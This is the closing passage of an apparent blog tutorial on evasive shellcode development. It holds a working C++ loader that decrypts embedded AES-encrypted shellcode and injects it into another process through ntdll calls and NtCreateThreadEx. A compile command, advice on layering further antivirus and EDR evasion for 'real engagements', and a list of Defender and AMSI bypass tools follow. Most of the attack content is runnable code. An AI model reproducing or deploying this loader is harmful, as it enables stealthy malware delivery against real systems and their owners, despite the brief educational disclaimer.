    pNtCreateThreadEx NtThread = (pNtCreateThreadEx)
        GetProcAddress(hNtdll, sNtThread);
    pNtOpenProcess NtOpen = (pNtOpenProcess)
        GetProcAddress(hNtdll, sNtOpen);

    if (!NtAlloc || !NtWrite || !NtProtect || !NtThread || !NtOpen) return 1;

    // ---- Phase 3: Decrypt shellcode ----
    unsigned char* decrypted = NULL;
    SIZE_T decrypted_len = 0;

    if (!AESDecrypt(encrypted_shellcode, sizeof(encrypted_shellcode),
                    aes_key, sizeof(aes_key),
                    aes_iv, sizeof(aes_iv),
                    &decrypted, &decrypted_len)) {
        return 1;
    }

    // ---- Phase 4: Find and open target process ----
    DWORD targetPID = FindTargetProcess();
    if (!targetPID) {
        SecureZeroMemory(decrypted, decrypted_len);
        HeapFree(GetProcessHeap(), 0, decrypted);
        return 1;
    }

    HANDLE hProcess = NULL;
    MY_OA oa = { sizeof(MY_OA), 0 };
    MY_CID cid = { (HANDLE)(ULONG_PTR)targetPID, 0 };

    NtOpen(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!hProcess) {
        SecureZeroMemory(decrypted, decrypted_len);
        HeapFree(GetProcessHeap(), 0, decrypted);
        return 1;
    }

    // ---- Phase 5: Inject via Nt APIs ----

    // Allocate RW memory in target
    PVOID remoteBase = NULL;
    SIZE_T regionSize = original_shellcode_size + 4096; // Extra padding
    NtAlloc(hProcess, &remoteBase, 0, &regionSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteBase) {
        SecureZeroMemory(decrypted, decrypted_len);
        HeapFree(GetProcessHeap(), 0, decrypted);
        CloseHandle(hProcess);
        return 1;
    }

    // Write decrypted shellcode to remote process
    SIZE_T written = 0;
    NtWrite(hProcess, remoteBase, decrypted,
            original_shellcode_size, &written);

    // Immediately zero local decrypted copy
    SecureZeroMemory(decrypted, decrypted_len);
    HeapFree(GetProcessHeap(), 0, decrypted);

    // Change remote memory to RX (W^X compliance)
    PVOID protBase = remoteBase;
    SIZE_T protSize = original_shellcode_size;
    ULONG oldProt = 0;
    NtProtect(hProcess, &protBase, &protSize,
              PAGE_EXECUTE_READ, &oldProt);

    // Create remote thread via NtCreateThreadEx
    HANDLE hThread = NULL;
    NtThread(&hThread, THREAD_ALL_ACCESS, NULL,
             hProcess, remoteBase, NULL,
             0, 0, 0, 0, NULL);

    // Wait briefly then exit (or wait for thread)
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    CloseHandle(hProcess);
    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ \
    -O2 -s -fno-exceptions -fno-rtti \
    -ffunction-sections -fdata-sections -Wl,--gc-sections \
    -static -mwindows \
    -o final_loader.exe final_loader.cpp \
    -lbcrypt -lws2_32
```

> This loader combines multiple techniques but is still a starting point. For a real engagement in 2026, you would add indirect syscalls (Technique 13) instead of direct `ntdll` calls, API hashing (Technique 11) instead of stack strings with `GetProcAddress`, sleep obfuscation (Technique 23) for long-running implants, and payload staging (Technique 25) instead of embedded shellcode. Each additional layer makes detection exponentially harder.
{: .prompt-tip }

---

## Part 10: References

### Microsoft Documentation

- [VirtualAlloc Function — Win32 API](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
- [VirtualProtect Function — Win32 API](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [CreateThread Function — Win32 API](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)
- [CreateRemoteThread Function — Win32 API](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
- [QueueUserAPC Function — Win32 API](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
- [BCrypt Functions — Win32 API](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/)
- [Memory Protection Constants](https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants)
- [Anti-Malware Scan Interface (AMSI)](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
- [Event Tracing for Windows (ETW)](https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal)

### Tools and Frameworks

- [SysWhispers2 — jthuraisamy](https://github.com/jthuraisamy/SysWhispers2) — Direct syscall stub generator for Windows
- [SysWhispers3 — klezVirus](https://github.com/klezVirus/SysWhispers3) — Updated syscall generator with indirect syscall support
- [Hell's Gate — am0nsec & smelly__vx](https://github.com/am0nsec/HellsGate) — Dynamic SSN resolution at runtime
- [Halo's Gate — sektor7](https://blog.sektor7.net/#!res/2021/halosgate.md) — SSN resolution when target functions are hooked
- [HookChain — M4v3r1ck](https://github.com/helviojunior/hookchain) — IAT manipulation combined with indirect syscalls
- [OffensiveRust — trickster0](https://github.com/trickster0/OffensiveRust) — Offensive security tools written in Rust
- [Metasploit Framework — Rapid7](https://github.com/rapid7/metasploit-framework) — Penetration testing framework (includes msfvenom)
- [DefenderCheck — matterpreter](https://github.com/matterpreter/DefenderCheck) — Identify bytes flagged by Windows Defender

### Research Papers and Blog Posts

- [Red Team Notes — Process Injection Techniques](https://www.ired.team/offensive-security/code-injection-process-injection) — Comprehensive process injection reference
- [Ekko Sleep Obfuscation — Austin Hudson (SecIdiot)](https://github.com/Cracked5pider/Ekko) — Sleep obfuscation via timer queue callbacks
- [Foliage — Austin Hudson](https://github.com/Cracked5pider/Foliage) — APC-based sleep obfuscation
- [Binary Defense — Detecting Sleep Obfuscation](https://www.binarydefense.com/resources/blog/memory-detection-of-cobalt-strike-beacons/) — How defenders detect sleep obfuscation
- [RedOps — Indirect Syscalls](https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls) — Detailed comparison of direct vs. indirect syscalls
- [Hackmosphere — Bypass Windows Defender 2025](https://hackmosphere.fr/bypass-windows-defender/) — Practical Defender bypass techniques
- [r-tec — AMSI Bypass 2025](https://www.r-tec.net/r-tec-blog-amsi-bypass-methods.html) — Current AMSI bypass methods and detections
- [0x12 Dark Development](https://www.youtube.com/@0x12) — Video tutorials on shellcode development
- [modexp — Windows Process Injection](https://modexp.wordpress.com/2018/08/23/process-injection-in-linux/) — In-depth injection technique analysis
- [MDSec — Nighthawk Evasion Techniques](https://www.mdsec.co.uk/nighthawk/) — Commercial C2 framework evasion documentation

### Books

- *Malware Development for Ethical Hackers* by Zhassulan Zhussupov (Packt, 2024)
- *Windows Internals, Part 1 & 2* by Pavel Yosifovich, Mark Russinovich, et al. (Microsoft Press)
- *The Art of Memory Forensics* by Michael Hale Ligh, et al. (Wiley)
- *Red Team Development and Operations* by Joe Vest and James Tubberville

### Useful GitHub Repositories

- [SysWhispers2 (common preset)](https://github.com/jthuraisamy/SysWhispers2) — Generates `.h`, `.c`, and `.asm` files for direct syscalls
- [InlineWhispers](https://github.com/outflanknl/InlineWhispers) — Inline assembly syscall stubs for BOFs
- [NimlineWhispers](https://github.com/ajpc500/NimlineWhispers) — Syscall stubs for Nim
- [rust-syscalls](https://github.com/janoglezcampos/rust_syscalls) — Syscall implementations in Rust
- [Freeze — Optiv](https://github.com/optiv/Freeze) — Payload creation tool using various suspension techniques
- [Scarecrow — Optiv](https://github.com/optiv/ScareCrow) — Payload creation framework for side-loading
- [SharpUnhooker](https://github.com/GetRektBoy724/SharpUnhooker) — .NET-based ntdll unhooking
- [TartarusGate](https://github.com/trickster0/TartarusGate) — Extension of Hell's Gate for heavily hooked environments

---

## Final Thoughts

Shellcode development is a constantly evolving discipline. The techniques in this blog represent the state of the art as of early 2026, but the landscape changes rapidly. What works today may be detected tomorrow, and new bypass techniques emerge regularly.

**Key takeaways:**

1. **Layered evasion is mandatory** — No single technique bypasses all defenses. Combine encryption, API obfuscation, syscalls, and injection for best results.

2. **Understand what you're bypassing** — Don't blindly copy code. Understand the detection mechanism so you can adapt when it changes.

3. **Test continuously** — Build a testing pipeline with real Defender and EDR products. Test every change.

4. **OPSEC is as important as evasion** — Unique keys, unique binaries, proper target selection, and operational discipline separate professionals from amateurs.

5. **Stay current** — Follow the researchers and repositories linked above. The offensive security community openly publishes new techniques that you should understand and integrate.

> This blog is a living document. As Windows defenses evolve, so must our techniques. The fundamentals — memory management, API calling conventions, syscall mechanics — remain constant even as specific implementations change.
{: .prompt-info }

---

*Written for educational and authorized testing purposes. Practice responsibly.*
